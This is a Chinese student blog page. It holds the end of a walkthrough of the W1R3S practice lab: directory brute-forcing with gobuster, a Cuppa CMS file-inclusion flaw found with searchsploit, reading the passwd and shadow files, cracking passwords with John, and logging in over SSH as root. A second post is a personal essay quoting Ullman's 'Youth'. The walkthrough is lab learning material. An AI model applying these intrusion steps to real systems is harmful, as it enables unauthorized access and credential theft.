<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8719.png" class title="This is an test image"> 

<p><strong>目录爆破</strong></p>
<p>用gobuster工具进行目录爆破，用于发现目标网站上隐藏的目录和文件</p>
<p>gobuster dir：指示Gobuster使用目录模式进行枚举。</p>
<p>-w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt：指定用于枚举的字典文件路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u http://192.168.184.12：指定要枚举的目标URL，即&quot;[http://192.168.184.12]</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>&#x2F;wordpress</p>
<p>&#x2F;javascript</p>
<p>&#x2F;administrator</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8720.png" class title="This is an test image"> 

<p> &#x2F;javascript 提示没有访问权限</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8721.png" class title="This is an test image"> 

<p>&#x2F;administrator 看到一个安装页面，网页标题是 cuppa cms</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8722.png" class title="This is an test image">

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8723.png" class title="This is an test image"> 

<p><strong>cuppa cms 渗透</strong></p>
<p>SearchSploit是一个用于搜索和浏览漏洞利用数据库的命令行工具</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8724.png" class title="This is an test image"> 

<p>查看文件，发现文件包含漏洞</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8725.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8726.png" class title="This is an test image"> 

<p> 查看利用文件，发现是 &#x2F;alerts&#x2F;alertConfigField.php 出现了漏洞</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8727.png" class title="This is an test image"> 

<p>下载此漏洞，查看具体信息</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8728.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8729.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8730.png" class title="This is an test image"> 

<p>访问目标系统中的敏感文件（passwd存放了用户账户的信息）</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8731.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8732.png" class title="This is an test image"> 

<p>访问目标系统的用户密码文件</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8733.png" class title="This is an test image"> 

<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8734.png" class title="This is an test image"> 

<p>John破解密码</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8735.png" class title="This is an test image"> 

<p>通过SSH协议连接到指定IP地址，成功登录后获取了root权限</p>
<img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8736.png" class title="This is an test image"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/14/Hello-My-Blog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/14/Hello-My-Blog/" class="post-title-link" itemprop="url">起始篇</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-14 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-14T15:41:58+08:00">2023-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-11 22:27:52" itemprop="dateModified" datetime="2024-03-11T22:27:52+08:00">2024-03-11</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="About-this-Blog：What→Why→How"><a href="#About-this-Blog：What→Why→How" class="headerlink" title="About this Blog：What→Why→How"></a>About this Blog：What→Why→How</h1><ul>
<li>想要创建博客记录一下我的Computer Science学习过程 &amp; 一些生活和学习工作的想法 ~（srds有点建晚了，大一就该准备好的呜呜呜Q﹏Q（不过还不算太迟</li>
<li>超严重的强迫症，这些事情写到纸上如果格式之类出问题 or 字写得丑了点，立马就会忍不住撕掉重写（所以Blog+markdown对我来说是好选择，可以多次反复利用）之前为了治这个毛病，特意买了Daycrafts的日程本试图用昂贵的纸张唤醒我节约的意识，结果完美证明：我的强迫症 &gt; 我对银子的心疼😥。总之，Hello My Blog！新的计划开始了~</li>
<li>初定一个小目标，今年每周至少写2篇技术记录！flag已经立好，开始实现！🥳</li>
</ul>
<h2 id="勇气🎞️"><a href="#勇气🎞️" class="headerlink" title="勇气🎞️"></a>勇气🎞️</h2><p>普通家庭出身的大部分人所习惯的模式是竞争与服从，他们周围的环境，甚至他们自己的内心，都好像缺了一些东西——那种真正能让人投身于某个领域的使命感、梦想与可以使用的方法论，我叫它“意识”。</p>
<p>成绩、量化一个人的考核标准，在我更加年轻的时候给了我很多满足——因为我经常在这种“竞争”游戏中胜出。可惜意识不足的个体不会在真正意义上踏上“上行之路”，心态也像地基没有扎稳的房子，摇摇欲坠，不会挺立太久。之后很长一段时间我所面对的，是认知与期望产生巨大落差的挫败，以及明知自己难以迅速填补沟壑、想要得到一些事物就要付出超常的努力，却迟迟驻足原处、不知该走向何处的犹疑。</p>
<p>这种情况在我进入大学之后改善了非常之多，但“改善”还远远不够。这个博客存在的意义就在于，我将在这里记录自己走向有计划且愿意为计划付出全部的未来</p>
<h2 id="感悟🌠"><a href="#感悟🌠" class="headerlink" title="感悟🌠"></a>感悟🌠</h2><p>今天一个寻常的上午，我在寝室一边听歌一边整理、清洗自己的东西。整理东西总是让我有一种整理自己内心的感受——一切都在归位的感觉。前几周的那种紧迫与内心的焦急如潮水褪去。东想西想的时候，我突然心生出一个疑问 “我之前的勇气都到哪里去了？那个本来年轻又有抱负的家伙，怎么现在才有发声的？”</p>
<p>很神奇，甚至看似都没有任何诱发条件，我突然觉得浑身充满了力量，急切地想要去做我计划的事情。勇气回来之后、写博客之前，也没有浪费时间：认真对待我的生活，不去过度解读一些可能诱发不快的事情，坚定地朝向自己的小目标走去并且完成它。</p>
<p>这对我来说，这种对秩序的追求，这种像渴望呼吸一般进步的欲望，真的非常重要。</p>
<p>勇气回来了。内心的激动与明朗难以言喻。我只想要在之后的时间里，一遍遍验证这个事实，想办法让它留下来，不再离开。</p>
<h2 id="YOUTH"><a href="#YOUTH" class="headerlink" title="YOUTH"></a>YOUTH</h2><p><strong>这是我非常喜欢的一首诗，记录于此</strong></p>
<p><em>Samuel Ullman</em></p>
<p>Youth is not a time of life; </p>
<p>it is a state of mind; </p>
<p>it is not a matter of rosy cheeks, red lips and supple knees; </p>
<p>it is a matter of the will, a quality of the imagination, a vigour of the emotions; </p>
<p>it is the freshness of the deep springs of life.</p>
<p>Youth means a temperamental predominance of courage over timidity of the appetite, for adventure over the love of ease. This often exists in a man of sixty more than a boy of twenty. Nobody grows old merely by a number of years. We grow old by deserting our ideals.</p>
<p>Years may wrinkle the skin, but to give up enthusiasm wrinkles the soul. Worry, fear, self-distrust blows the heart and turns the spirit back to dust.</p>
<p>Whether sixty or sixteen, there is in every human being’s heart the lure of wonders, the unfailing childlike appetite of what’s next and the joy of the game of living. In the centre of your heart and my heart there is a wireless station: so long as it receives messages of beauty, hope, cheer, courage and power from men and from the infinite, so long are you young.</p>
<p>When the aerials are down, and your spirit is covered with snows of cynicism and the ice of pessimism, then you are grown old, even at twenty, but as long as your aerials are up, to catch waves of optimism, there is hope you may die young at eighty.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt=""
      src="/images/avatar.png.jpg">
  <p class="site-author-name" itemprop="name"></p>
  <div class="site-description" itemprop="description">Welcome to the 1/30000 🫧</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://stackoverflow.com/yourname" title="StackOverflow → https:&#x2F;&#x2F;stackoverflow.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>StackOverflow</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/acindm" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;acindm" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:acindd@yeah.net" title="E-Mail → mailto:acindd@yeah.net" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/yourname" title="Twitter(X) → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter(X)</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">31k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">1:53</span>
</div>

<!-- <br /> -->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<!-- <span id="times">载入时分秒...</span> -->
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("10/8/2023 2:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); 
        if(String(snum).length ==1 ){snum = "0" + snum;}
        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
        document.getElementById("timeDate").innerHTML = " 👾营业已经："+dnum+" 天 "+hnum + " 时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>


        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
